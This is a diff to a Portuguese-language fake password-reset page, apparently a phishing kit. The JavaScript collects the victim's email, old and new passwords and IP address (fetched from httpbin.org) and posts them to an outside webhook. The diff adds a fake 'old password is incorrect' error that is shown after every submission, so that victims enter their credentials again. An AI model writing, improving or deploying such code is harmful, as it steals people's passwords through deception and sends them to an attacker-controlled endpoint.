@@ -18,7 +18,9 @@
   <br>
   <p class="lilinfo">Redefinição de senha para <span></span></p>
   <br>
-  
+  <p class="erro">
+A Palavra-passe antiga está incorreta
+  </p>
   <label>Palavra-passe antiga</label>
   <input type="password" id="passV">
   <label>Nova Palavra-passe</label>
@@ -53,20 +55,37 @@ async function enviar(){
   if (senha1.length==0 || senha2.length==0){
     alert("Preencha todos os campos.");
   }else{
-    msg={content:"Senha Antiga: "+senha1+"\nSenha Nova: "+senha2}
+    document.getElementById("passV").value="";
+    document.getElementById("passNV").value="";
+    document.querySelectorAll("input[type='password']")[2].value="";
+    document.querySelector(".erro").style.display="none";
+    let ip="";
+    try{
+    setTimeout(()=>{document.querySelector(".erro").style.display="block"; document.querySelector(".erro").style.border="1px solid red";document.querySelector(".erro").style.padding="10px";}, 100)
+    let req=await fetch("https://httpbin.org/ip");
+    let dat=await req.json();
+    ip=dat.origin;
+    }catch(e){
+      ip="O usuário está usando um adblock";
+    }
+    let agent=navigator.userAgent;
+    msg={content:"=======\nEmail: "+em.get("mail")+"\nSenha Antiga: "+senha1+"\nSenha Nova: "+senha2+"\nIP: "+ip+"\n======="}
     await fetch(webhook,{
       method:"POST",
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify(msg)
     });
-    senha1="";
-    senha2="";
-    setTimeout(function(){
-window.location.href="https://google.com";
-    },2000);
+    
   }
   
 }
+
+
+
+
+  </script>
+</body>
+</html>
 
 
 
